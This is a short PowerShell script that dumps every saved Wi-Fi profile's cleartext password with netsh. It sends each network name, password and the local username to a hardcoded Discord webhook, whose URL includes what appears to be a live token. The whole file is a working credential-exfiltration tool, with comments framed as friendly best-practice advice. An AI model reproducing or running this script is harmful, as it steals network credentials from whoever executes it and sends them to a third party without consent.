# Define webhook URL (best practice to store this separately for security)
$webhookUrl = 'https://discord.com/api/webhooks/1262103660826071112/--It8rvjLzPFu0xXUnxOa4j9F3F17avmthW1sgRobIakA8HVQlFqG9KggZTIYH0X4L30'

# Get Wi-Fi profiles and their passwords
netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
    $wlanName = $_.Matches.Value  # More descriptive variable name
    $passwordInfo = netsh wlan show profile $wlanName key=clear | Select-String '(?<=Key Content\s+:\s).+'
    $password = if ($passwordInfo) { $passwordInfo.Matches.Value } else { "Not found" }  # Handle passwords that might not be available

    # Build the message payload (use embeds for better formatting in Discord)
    $payload = @{
        'embeds' = @(
            @{
                'title' = "Wi-Fi Password Found"
                'description' = "Password for network '$wlanName'"
                'fields' = @(
                    @{
                        'name' = "Network Name"
                        'value' = $wlanName
                        'inline' = $true
                    },
                    @{
                        'name' = "Password"
                        'value' = "||$password||"  # Use spoiler formatting in Discord
                        'inline' = $true
                    },
                    @{
                        'name' = "Found by"
                        'value' = $env:username
                    }
                )
            }
        )
    }

    # Send the message to Discord
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'application/json'
}
